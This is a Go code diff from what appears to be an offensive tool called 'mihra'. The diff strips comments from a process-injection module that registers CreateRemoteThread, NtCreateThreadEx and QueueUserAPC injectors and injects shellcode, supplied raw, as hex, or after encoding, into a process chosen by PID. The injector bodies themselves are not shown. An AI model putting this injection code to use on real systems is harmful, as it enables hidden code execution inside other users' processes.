@@ -6,7 +6,6 @@ import (
 	"github.com/0xvyper/mihra/module"
 )
 
-// Module represents the process injection module
 type Module struct {
 	Name        string
 	Description string
@@ -14,7 +13,6 @@ type Module struct {
 	injectors   map[string]Injector
 }
 
-// NewModule creates a new process injection module instance
 func NewModule() *Module {
 	m := &Module{
 		Name:        "process_injection",
@@ -23,7 +21,7 @@ func NewModule() *Module {
 		injectors:   make(map[string]Injector),
 	}
 
-	// Register all injectors
+	
 	m.RegisterInjector(NewCreateRemoteThreadInjector())
 	m.RegisterInjector(NewNtCreateThreadExInjector())
 	m.RegisterInjector(NewQueueUserAPCInjector())
@@ -56,12 +54,10 @@ func (m *Module) GetInfo() module.ModuleInfo {
 	}
 }
 
-// RegisterInjector registers an injector with the module
 func (m *Module) RegisterInjector(injector Injector) {
 	m.injectors[injector.Name()] = injector
 }
 
-// GetInjector returns an injector by name
 func (m *Module) GetInjector(name string) (Injector, error) {
 	injector, ok := m.injectors[name]
 	if !ok {
@@ -70,7 +66,6 @@ func (m *Module) GetInjector(name string) (Injector, error) {
 	return injector, nil
 }
 
-// ListInjectors returns a list of all registered injectors
 func (m *Module) ListInjectors() []string {
 	var names []string
 	for name := range m.injectors {
@@ -79,7 +74,6 @@ func (m *Module) ListInjectors() []string {
 	return names
 }
 
-// InjectShellcode injects shellcode using the specified technique
 func (m *Module) InjectShellcode(technique string, pid int, shellcode []byte) error {
 	injector, err := m.GetInjector(technique)
 	if err != nil {
@@ -89,7 +83,6 @@ func (m *Module) InjectShellcode(technique string, pid int, shellcode []byte) er
 	return injector.Inject(pid, shellcode)
 }
 
-// GetInjectorDescription returns the description of an injector
 func (m *Module) GetInjectorDescription(name string) (string, error) {
 	injector, err := m.GetInjector(name)
 	if err != nil {
@@ -98,7 +91,6 @@ func (m *Module) GetInjectorDescription(name string) (string, error) {
 	return injector.Description(), nil
 }
 
-// ShellcodeFromHex converts a hex string to shellcode and injects it
 func (m *Module) ShellcodeFromHex(technique string, pid int, hexStr string) error {
 	utils := NewShellcodeUtils()
 	shellcode, err := utils.HexToShellcode(hexStr)
@@ -109,13 +101,12 @@ func (m *Module) ShellcodeFromHex(technique string, pid int, hexStr string) erro
 	return m.InjectShellcode(technique, pid, shellcode)
 }
 
-// EncodeAndInjectShellcode encodes shellcode and injects it
 func (m *Module) EncodeAndInjectShellcode(technique string, pid int, shellcode []byte, key byte) error {
 	utils := NewShellcodeUtils()
 	encoded := utils.EncodeShellcode(shellcode, key)
 
-	// For this example, we'll decode it immediately before injection
-	// In a real scenario, you might want to inject the encoded shellcode and decode it in the target process
+	
+	
 	decoded := utils.DecodeShellcode(encoded, key)
 
 	return m.InjectShellcode(technique, pid, decoded)
